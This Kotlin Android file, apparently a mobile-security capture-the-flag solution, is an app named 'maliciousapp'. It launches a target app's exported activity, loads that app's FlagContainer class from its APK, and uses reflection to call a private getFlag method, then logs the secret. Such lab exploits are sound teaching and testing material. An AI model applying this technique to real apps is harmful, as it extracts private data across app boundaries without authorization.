package com.example.maliciousapp

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

import com.example.victimapp.FlagContainer

import dalvik.system.PathClassLoader

import java.io.Serializable

class MainActivity : AppCompatActivity() {
    val TAG = "MOBIOTSEC"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }

    override fun onStart() {
        super.onStart()
        getFlag()
    }

    private fun getFlag() {
        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.SerialActivity"
            )
        }
        val contract = ActivityResultContracts.StartActivityForResult()
        registerForActivityResult(contract) { result ->
            val container = result
                .data
                ?.getSerializableExtra("flag", containerClass())

            container?.let {
                val flag = it::class
                    .java
                    .getDeclaredMethod("getFlag")
                    .apply { setAccessible(true) }
                    .invoke(it)
                Log.d(TAG, "The flag is $flag")
            }
        }.launch(intent)
    }

    private fun containerClass(): Class<Serializable> {
        try {
            val apk = getPackageManager()
                .getApplicationInfo("com.example.victimapp", 0)
                .sourceDir
            val cl = PathClassLoader(apk, ClassLoader.getSystemClassLoader())
                .loadClass("com.example.victimapp.FlagContainer")
            Log.d(TAG, cl.toString())
        } catch (e: Exception) {
            Log.e(TAG, e.toString())
        }

        return FlagContainer::class.java as Class<Serializable>
    }
}
